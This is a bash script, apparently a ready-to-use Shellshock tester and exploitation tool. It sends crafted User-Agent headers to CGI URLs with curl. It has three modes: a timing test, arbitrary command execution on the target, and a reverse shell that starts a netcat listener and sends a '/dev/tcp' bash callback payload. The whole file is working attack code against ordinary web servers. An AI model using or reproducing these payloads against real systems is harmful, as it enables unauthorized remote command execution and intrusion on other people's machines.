#!/bin/bash
#
# Shellshock Tester and Exploitation Script
# 
# Author: @coreb1t
#
###########################################

WHITE_BOLD="\e[1m\e[37m"
GREEN="\e[32m"
GREEN_BOLD="\e[1m\e[32m"
RED="\e[31m"
RED_BOLD="\e[1m\e[31m"
RESET="\e[0m"

function usage(){

	echo "Usage: <URL to cgi> test"
	echo "       <URL to cgi> cmd <cmd>"
	echo "       <URL to cgi> reverse <lhost> <lport>" 

	echo "Example: $0 http://10.1.10.1/cgi-bin/admin.cgi test"
}


function test_shellshock(){

	url=$1

	echo -e "${GREEN_BOLD}TEST SHELLSHOCK [#1]: delay 5 sec ${RESET}"
	curl -H "User-Agent: () { :; }; /bin/bash -c 'sleep 5'" $url
	echo ""
	echo -e "${GREEN_BOLD}TEST SHELLSHOCK [#2]: echo ShellShock (RED) ${RESET}"
	curl -H "User-Agent: () { :; }; /bin/bash -c 'echo -e \"\033[1m\e[31mShellShock\e[0m\"'" $url
	echo ""
	echo -e "${GREEN_BOLD}TEST SHELLSHOCK [#2]: echo ShellShock ${RESET}"
	curl -H "User-Agent: () { :; }; /bin/bash -c 'echo \"ShellShock\"'" $url
	echo ""
	exit
}


function exec_cmd(){

	url=$1
	cmd=$2

	echo -e "${GREEN_BOLD}COMMAND EXECUTION${RESET}"
	echo -e "${WHITE_BOLD}curl -H \"User-Agent: () { :; }; /bin/bash -c '<cmd>'\"" $url; echo -e "${RESET}"
	curl -H "User-Agent: () { :; }; /bin/bash -c '${cmd}; echo -e \"${GREEN_BOLD}\"; ${cmd}; echo -e \"${RESET}\"'" $url
}


function reverse_shell(){
	url=$1
	lhost=$2
	lport=$3

	echo -e "${GREEN_BOLD}REVERSE SHELL${RESET}"
	echo -e "${WHITE_BOLD}1) Listener: nc -vnlp $lport${RESET}" 
	gnome-terminal -e "nc -vnlp $lport"
	echo -e "${WHITE_BOLD}2) curl -H \"User-Agent: () { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'\"" $url; echo -e "${RESET}"

	curl -H "User-Agent: () { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'" $url
}


if [ "$#" -lt 2 ]; then
	usage
	exit
fi

url=$1
mode=$2

case "$mode" in

        "test") test_shellshock $url 
		;;

		"cmd") exec_cmd $url $3
		;;

		"reverse") reverse_shell $url $3 $4
		;;
esac